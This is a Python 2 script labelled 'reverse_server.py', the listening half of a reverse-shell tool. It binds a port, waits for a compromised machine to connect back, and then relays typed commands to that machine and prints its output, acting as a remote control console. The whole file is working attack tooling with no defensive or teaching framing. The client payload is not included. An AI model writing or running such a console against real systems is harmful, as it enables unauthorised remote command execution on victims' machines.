#!/usr/bin/env python
# -*- coding: utf-8 -*-
# reverse_server.py
# reverse-shell-python
# http://malu.me
# Version 1.0

import sys, os, os.path
import socket 
import time
import threading
import signal

def isset(v): 
    try : 
        type (eval(v)) 
    except : 
        return 0
    else :
        return 1

def quit(signum, frame):
    print 'You choose to stop me.'
    sys.exit()

class ReverseShellServer:
    
    host = ''
    port = None
    s = None
    max_bind_retries = 10
    conn = None
    addr = None
    hostname = None
    
    def create(self, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.port = port

    def bind(self, current_try=0):
        try:
            print "listening on port %s (attempt %d)" % (self.port, current_try)
            self.s.bind((self.host, self.port))
            self.s.listen(1024)
        except socket.error as msg:
            print >> sys.stderr, 'socket binding error:', msg[0]
            if current_try < self.max_bind_retries: 
                print >> sys.stderr, 'retrying...'
                self.bind(current_try + 1)

    def accept(self):
        try:
            self.conn, self.addr = self.s.accept()
            print '[!] session opened at %s:%s' % (self.addr[0], self.addr[1])
            self.menu()
        except socket.error as msg:
            print >> sys.stderr, 'socket accepting error:', msg[0]

    def menu_recv(self):
        while True:
            try:
                data = self.conn.recv(16834)
            except socket.error as msg:
                msg
                data = None
            if data:
                sys.stdout.write(data)
                #print data[:-1],
                sys.stdout.flush()

    def menu_input(self):
        while True:
            #time.sleep(0.15)
            cmd = raw_input("")
            cmd += "\n"
            command = self.conn.send(cmd)

    def menu(self):
        signal.signal(signal.SIGINT, quit)
        signal.signal(signal.SIGTERM, quit)
        self.conn.setblocking(0)
        self.conn.settimeout(0.01)
        thread = threading.Thread(target=self.menu_recv)
        thread.setDaemon(True)
        thread.start()
        thread_B = threading.Thread(target=self.menu_input)
        thread_B.setDaemon(True)
        thread_B.start()
        while True:
            pass

def main(args):
    server = ReverseShellServer()
    server.create(args.port)
    server.bind()
    server.accept()
    print '[*] returned from socketAccept'
    return 0

if __name__ == '__main__':
    from argparse import ArgumentParser
    p = ArgumentParser()
    p.add_argument('--port', '-p', type=int, default=9300)
    args = p.parse_args()
    code = main(args)
    exit(code)
